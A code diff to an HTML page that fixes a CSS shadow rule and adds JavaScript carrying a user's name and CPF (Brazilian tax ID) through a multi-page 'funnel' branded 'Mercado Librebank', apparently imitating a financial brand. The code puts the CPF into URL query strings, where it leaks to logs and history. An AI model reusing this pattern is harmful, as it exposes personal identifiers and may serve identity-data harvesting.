@@ -163,9 +163,7 @@
             height: 65px;
             width: auto;
             animation: logoAppear 0.8s ease-out;
-        }
-
-        shadow(0 2px 8px rgba(0, 0, 0, 0.1));
+            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.1));
         }
 
         @keyframes logoAppear {
@@ -602,6 +600,12 @@
             document.getElementById('user-name').textContent = userData.nome;
             document.getElementById('user-birth').textContent = userData.data_nascimento;
 
+            // Save user data for the rest of the funnel
+            sessionStorage.setItem('Mercado Librebank_user_data', JSON.stringify({
+                nome: userData.nome,
+                cpf: cpf
+            }));
+
         } catch (error) {
             document.getElementById('loading-screen').classList.add('hidden');
             document.getElementById('form-screen').classList.remove('hidden');
@@ -610,7 +614,14 @@
     });
 
     document.getElementById('continuar-final').addEventListener('click', function () {
-        window.location.href = buildUrlWithParams('/home.html/validacao.html/2.html/');
+        const url = new URL(buildUrlWithParams('./2.html/'), window.location.href);
+        const userDataStr = sessionStorage.getItem('Mercado Librebank_user_data');
+        if (userDataStr) {
+            const userData = JSON.parse(userDataStr);
+            if (userData.nome) url.searchParams.set('nome', userData.nome);
+            if (userData.cpf) url.searchParams.set('cpf', userData.cpf);
+        }
+        window.location.href = url.toString();
     });
 </script>
 
